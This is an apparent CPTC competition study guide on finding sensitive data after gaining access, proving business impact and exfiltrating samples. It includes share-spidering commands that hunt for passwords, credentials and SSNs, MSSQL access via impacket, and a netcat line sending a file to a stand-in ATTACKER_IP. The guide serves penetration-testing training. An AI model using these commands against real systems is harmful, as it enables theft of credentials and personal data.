# 11 — Data Hunting, Exfil & Proving Impact

**Goal:** CPTC is won on **business impact**, not shells. Once you have access, find the data/systems
that matter to the fictional business and demonstrate the risk clearly and safely.

## Find the sensitive stuff
```bash
# Share hunting across the domain
nxc smb <SUBNET> -u '<USER>' -p '<PASS>' --shares
Find-DomainShare -CheckShareAccess          # PowerView
# Spider/keyword shares for secrets
nxc smb <TARGET_IP> -u '<USER>' -p '<PASS>' -M spider_plus
manspider <SUBNET> -u '<USER>' -p '<PASS>' -f passw cred secret ssn account confidential
```
Look for: password files, `.kdbx`, `.ppk`/`.pem`, config with connection strings, backups (`.bak`,
NTDS.dit copies), finance/HR/customer records, source code, share-stored DB dumps.

## Databases
```bash
impacket-mssqlclient <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> -windows-auth
#   SELECT name FROM sys.databases;  then read the business tables (Employees, Customers, Invoices...)
```
Map found records back to the scenario: "read N customer rows / financial records" is the finding.

## Demonstrate impact safely
- Pull a **minimal, representative sample** as proof (a few redacted rows), not the whole dataset.
- Screenshot the access + a redacted sample; record counts ("table has 12,400 rows").
- Tie it to a business consequence (regulated data exposure, fraud, operational disruption).

## Exfil (only if in scope, and minimally)
```bash
# Over your own channel; keep it small and logged
nc <ATTACKER_IP> 443 < sample.csv           # attacker: nc -lvnp 443 > sample.csv
# Or stage to your SMB and pull
impacket-smbserver share . -smb2support
```

## Evidence to capture
- The data-access path (who → what), a redacted sample, and record counts.
- The business-impact statement for the executive summary.

## Pitfalls
- **Never exfil real-looking PII in bulk** — a small proof sample is enough and is the professional choice.
- Don't delete/modify business data; you're proving access, not causing damage.
- Confirm exfil is permitted by the ROE before moving anything off a host.
